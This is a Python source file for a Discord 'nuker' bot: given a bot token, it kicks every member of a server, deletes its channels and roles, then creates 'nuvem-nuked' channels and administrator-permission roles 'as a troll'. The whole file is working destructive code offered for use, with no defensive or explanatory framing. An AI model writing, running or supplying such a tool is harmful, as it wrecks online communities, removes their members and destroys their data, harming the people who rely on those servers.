import requests
import time
from rocket import rocket_launch_animation

class Nuker:
    def __init__(self, token):
        self.token = token
        self.headers = {
            'Authorization': f'Bot {self.token}',
            'Content-Type': 'application/json'
        }
        self.api_url = 'https://discord.com/api/v10'

    def get_servers(self):
        url = f'{self.api_url}/users/@me/guilds'
        try:
            res = requests.get(url, headers=self.headers)
            if res.status_code == 200:
                return res.json()
            else:
                print(f"Failed to get servers: Status code {res.status_code}")
                return []
        except Exception as e:
            print(f"Error fetching servers: {e}")
            return []

    def kick_all_members(self, guild_id):
        url = f'{self.api_url}/guilds/{guild_id}/members'
        members = []
        try:
            res = requests.get(url, headers=self.headers)
            if res.status_code == 200:
                members = res.json()
            else:
                print(f"Failed to get members: Status code {res.status_code}")
                return
        except Exception as e:
            print(f"Error getting members: {e}")
            return

        print(f"Kicking {len(members)} members...")

        for member in members:
            user_id = member['user']['id']
            kick_url = f'{self.api_url}/guilds/{guild_id}/members/{user_id}'
            r = requests.delete(kick_url, headers=self.headers)
            if r.status_code == 204:
                print(f"Kicked user {user_id}")
            else:
                print(f"Failed to kick user {user_id}: {r.status_code}")
            time.sleep(0.3)

    def delete_channels(self, guild_id):
        url = f'{self.api_url}/guilds/{guild_id}/channels'
        try:
            res = requests.get(url, headers=self.headers)
            if res.status_code == 200:
                channels = res.json()
                for channel in channels:
                    del_url = f'{self.api_url}/channels/{channel["id"]}'
                    r = requests.delete(del_url, headers=self.headers)
                    if r.status_code == 204:
                        print(f"Deleted channel {channel['name']}")
                    else:
                        print(f"Failed to delete channel {channel['name']}: {r.status_code}")
                    time.sleep(0.3)
            else:
                print(f"Failed to get channels: Status code {res.status_code}")
        except Exception as e:
            print(f"Error deleting channels: {e}")

    def delete_roles(self, guild_id):
        url = f'{self.api_url}/guilds/{guild_id}/roles'
        try:
            res = requests.get(url, headers=self.headers)
            if res.status_code == 200:
                roles = res.json()
                for role in roles:
                    if role['managed'] or role['name'] == '@everyone':
                        continue
                    del_url = f'{self.api_url}/guilds/{guild_id}/roles/{role["id"]}'
                    r = requests.delete(del_url, headers=self.headers)
                    if r.status_code == 204:
                        print(f"Deleted role {role['name']}")
                    else:
                        print(f"Failed to delete role {role['name']}: {r.status_code}")
                    time.sleep(0.3)
            else:
                print(f"Failed to get roles: Status code {res.status_code}")
        except Exception as e:
            print(f"Error deleting roles: {e}")

    def create_channel(self, guild_id, name):
        url = f'{self.api_url}/guilds/{guild_id}/channels'
        json_data = {"name": name, "type": 0}  # text channel
        try:
            r = requests.post(url, headers=self.headers, json=json_data)
            if r.status_code == 201:
                print(f"Created channel {name}")
            else:
                print(f"Failed to create channel {name}: {r.status_code}")
        except Exception as e:
            print(f"Error creating channel: {e}")

    def create_role(self, guild_id, name):
        url = f'{self.api_url}/guilds/{guild_id}/roles'
        json_data = {"name": name, "permissions": "8"}  # admin perms
        try:
            r = requests.post(url, headers=self.headers, json=json_data)
            if r.status_code == 201:
                print(f"Created role {name}")
            else:
                print(f"Failed to create role {name}: {r.status_code}")
        except Exception as e:
            print(f"Error creating role: {e}")

    def nuke(self, guild_id):
        print("Starting nuke...")
        self.kick_all_members(guild_id)
        self.delete_channels(guild_id)
        self.delete_roles(guild_id)

        # Create 5 new channels and roles as a troll
        for i in range(5):
            self.create_channel(guild_id, f"nuvem-nuked-{i+1}")
            self.create_role(guild_id, f"nuvem-role-{i+1}")

        rocket_launch_animation()
        print("Nuke complete!")